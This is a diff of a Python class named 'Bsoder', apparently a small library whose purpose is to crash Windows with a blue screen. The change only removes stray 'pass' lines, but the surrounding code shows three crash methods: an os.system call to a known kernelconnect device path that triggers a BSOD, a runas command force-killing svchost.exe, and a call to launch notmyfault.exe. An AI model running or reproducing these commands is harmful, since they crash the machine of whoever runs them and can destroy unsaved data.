@@ -24,7 +24,7 @@ class Bsoder:
 
 	def __init__(self):
 		print("this lib will reboot your pc man times")
-	pass
+	
 
 	"""
 		Call`s simple bsod using simle cmd command that is called by os module in python
@@ -34,7 +34,7 @@ class Bsoder:
 	"""
 	def simplest__bsod(self):
 		os.system("\\.\globalroot\device\condrv\kernelconnect")
-	pass
+	
 
 	"""
 		Call`s simple bsod using simple cmd command that is called by os module in python
@@ -47,7 +47,7 @@ class Bsoder:
 	def taskmanger_way(self):
 		os.chdir("C:\Windows\System32")
 		os.system("runas /user:administrator TASKKILL /IM svchost.exe /F")
-	pass
+	
 	"""
 		Runs simple tool by Microsoft and let you manualy run bsod.
 		You can run it as :
@@ -55,7 +55,7 @@ class Bsoder:
 	"""
 	def use_external(self):
 		os.system("notmyfault.exe")
-	pass
+	
 
 
 """
